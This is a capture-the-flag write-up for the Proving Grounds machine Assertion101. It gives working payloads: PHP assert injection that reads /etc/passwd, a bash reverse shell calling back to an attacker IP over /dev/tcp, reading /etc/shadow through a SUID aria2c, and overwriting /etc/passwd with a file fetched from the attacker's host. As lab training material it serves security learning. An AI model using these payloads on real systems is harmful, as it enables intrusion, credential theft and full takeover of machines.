---
title: Assertion101 Writeup- Proving Grounds
date: 2022-11-06
excerpt: "Assertion101 is an intermediate rated Proving Grounds Play machine that covers command injection in PHP assert and SUID privesc."
categories:
  - Writeup
  - Proving_Grounds
tags:
  - Command Injection
  - SUID
ShowToc: true

---

Assertion101 is an intermediate rated Proving Grounds Play machine that covers command injection in PHP assert and SUID privesc. 
<!--more-->


## Foothold

Running NMAP returned ports 80 and 22 were open. `Gobuster` and `Nikto` did not return anything useful for the web server, but browsing through the web server we will notice a `page` parameter in the URL.

![pageparam](/assets/images/PG/assertion/possibleLFI.png)


The page parameter is really interesting and could mean an easy `LFI`. I intercepted the request and tried lots of `LFI` payload but the web server responds with either `Not so easy brother!` of `File does not exist`, after testing how the web application is detecting if I am trying `LFI` I discovered that if responds with `Not so easy brother!` whenever I have `..` in my payload. I tried double encoding but still did not work.

 I browsed to [Hacktricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert) and learned that there is something called PHP assert where it totally matches what we are getting. A web application that blocks `..` and responds with a custom error. Using `' and die(show_source('/etc/passwd')) or '` as a payload worked and returned the contents of `/etc/passwd`. Now trying with a simple bash reverse shell `page='+and+die(system("bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.134/80+0>%261'"))+or+'` will give as a shell in the box as `www-data`, and we also have the first flag.


 ## ROOT

 Running `linpeas.sh` will show that `aria2c` has a SUID bit set. Searching in [GTFObins](https://gtfobins.github.io/gtfobins/aria2c/) we can see that it is possible to privesc when SUID is set in `aria2c` but trying the listed commands in GTFObins did not work for me. 

 Reading the help page of `aria2c` we can see that we can specify a file to read using `-i` so I tried using the command `aria2c -i /etc/shadow` this successfully disclosed the contents of the shadow file. It was also possible to just read the flag in `/root/proof.txt` using this. 

 ![shadow](/assets/images/PG/assertion/shadow.png)


 Further reading the man page of `aria2c` looks like we can overwrite a file using `-d` and `-o` options. so testing this I generated a password for `root` using `openssl passwd -1 -salt root pass123` and then downloaded the `/etc/passwd` file so I can add the newly created password. 

 Using the following command I was able to download the updated `passwd` file from my machine and overwrite the current `/etc/passwd` in the target.

`aria2c -d /etc -o passwd "http://myIP/passwd" --allow-overwrite=true`

After this we just need to run `su root` and use the password `pass123` and we are root.

![root](/assets/images/PG/assertion/root.png)